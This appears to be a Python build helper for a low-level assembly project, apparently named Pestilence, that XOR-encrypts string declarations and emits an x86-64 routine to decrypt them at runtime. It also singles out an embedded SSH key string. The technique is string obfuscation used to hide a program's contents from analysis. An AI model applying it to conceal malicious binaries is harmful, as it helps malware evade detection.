#!/bin/python3

import re
from src.nbrs import is_hex

def write_decrypt_str() -> str:
	return '; rax: char *_decrypt_str(rsi: char *to_decrypt, rdi: len)\n_decrypt_str:\n; rax	== div quotient\n; rbx	-> to_decrypt\n; rcx	== counter\n; rdx	== div modulo\n; r9	== len key\n; r10	-> key_char\n; r11	-> decrypted str (mmap)\n; r12	== len to_decrypt\n; rsi	-> key\npush rbx\npush rcx\npush rdx\npush r8\npush r9\npush r10\npush r11\npush r12\nmov rbx, rdi\nmov r12, rsi\nxor rdi, rdi                    ; addr = NULL (let kernel choose)\nmov rdx, 0x03                   ; PROT_READ | PROT_WRITE = 1 | 2 = 3\nmov r10, 0x22                   ; MAP_PRIVATE | MAP_ANONYMOUS = 0x2 | 0x20 = 0x22\nmov r8, -1                      ; fd = -1\nxor r9, r9                      ; offset = 0\nmov rax, 9                      ; syscall number for mmap\nsyscall\ncmp rax, 0\njl _decrypt_loop_end\nmov r11, rax\nlea rsi, key\nmov r9, 0xc\nxor rcx, rcx\nxor rdx, rdx\n_decrypt_loop:\ncmp rcx, r12\njge	_decrypt_loop_end\nmov rax, rcx\nxor rdx, rdx\ncmp rcx, 0\njne _no_zero\nxor rax, rax\njmp _end_div\n_no_zero:\ndiv r9\n_end_div:\nmovzx r10, byte [rsi + rdx]	; r10 == key[rcx % key_len]\nxor r10b, [rbx+rcx]\nmov [r11+rcx], r10b\ninc rcx\njmp _decrypt_loop\n_decrypt_loop_end:\nmov rax, r11\npop r12\npop r11\npop r10\npop r9\npop r8\npop rdx\npop rcx\npop rbx\nret\n'

def line_declares_var(line: str) -> bool:
	keywords = {"db", "dw", "dd", "dq", "dt", "equ"}
	split_line = re.split(r'[ \t]', line)
	for step in split_line:
		if step in keywords:
			return True
	return False

def crypt_string(to_encrypt: list[int], key: str) -> str:
	str_crypted:str = ""
	is_print:bool = "ssh-ed" in to_encrypt
	if is_print:
		print(f"to encrypt -> [{to_encrypt}]")
	crypted = ""

	for i, item in enumerate(to_encrypt):
		key_char = key[i % len(key)]
		encrypt_char: int = ord(key_char) ^ item
		str_crypted += chr(encrypt_char)
		crypted += ", " + f'0x{encrypt_char:02X}'
	crypted = crypted[2:]
	return crypted

def split_key(key: str) -> str:
	b_key: str = ""
	for char in key:
		b_key += ", " + f'0x{ord(char):02X}'
	b_key = b_key[2:]
	return b_key

def split_str(string: str) -> list[int]:
	splitted:list[int] = []
	for char in string:
		splitted.append(ord(char))
	return splitted

def encrypt_strings(line: str, key:str) -> str:
	print("=================================================")
	# list all groups inside double quotes
	to_encrypt_list: list[str] = list(filter(len, re.split(r' (?=(?:[^"]*"[^"]*")*[^"]*$)', line.strip())))
	byte_list: list[int] = []
	final_line:str = ""
	print(f"to_encrypt_LIST -> {to_encrypt_list}")
	# if found the key -> change the defualt value to the actual key
	
	final_line += to_encrypt_list[0] + " "
	to_encrypt_list.pop(0)
	final_line += to_encrypt_list[0] + " "
	to_encrypt_list.pop(0)
	
	for to_encrypt in to_encrypt_list:
		to_encrypt = to_encrypt.strip().strip('",')
		print(f"to_encrypt -> {to_encrypt}")
		encrypted:str = ""
		if is_hex(to_encrypt) == True:
			byte_list.append(int(to_encrypt, 16))
		elif to_encrypt == "mykey":
			final_line += split_key(key) + "\n"
			return final_line
		elif to_encrypt[:10] == "Pestilence":
			return line
		else:
			byte_list += split_str(to_encrypt)
	print(f"final byte list({len(byte_list)}) -> {byte_list}")

	final_line += crypt_string(byte_list, key)
	# line = re.sub(re.escape(to_encrypt[: len(to_encrypt) - 1]), encrypted, line)
	# line = re.sub("\"", "", line)
	# line = line[:line.rfind(", ")]
	return final_line + "\n"

def obf_strings(line: str, key: str):
	if line_declares_var(line) == False:
		return line
	final_line:str = ""
	final_line: str = line
	index = final_line.find('"')
	if index == -1 and final_line[index:].find('"') == -1:
		final_line = line
	else:
		final_line = encrypt_strings(final_line, key)
	return final_line